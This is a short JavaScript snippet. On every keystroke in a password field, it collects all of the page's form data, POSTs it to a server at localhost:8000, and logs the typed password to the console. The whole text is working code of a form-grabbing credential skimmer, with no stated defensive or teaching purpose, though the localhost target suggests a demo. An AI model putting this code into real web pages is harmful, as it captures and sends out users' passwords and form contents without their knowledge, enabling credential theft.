const form = document.querySelector('form');
document.getElementById('password').addEventListener('input', async function (event) {
    // get all form values
    const formData = new FormData(form);
    // post form to http://localhost:8000
    const results = await fetch('http://localhost:8000', {
        method: 'POST',
        body: formData,
    });
    console.log('Key pressed:', event.target.value, results);
});
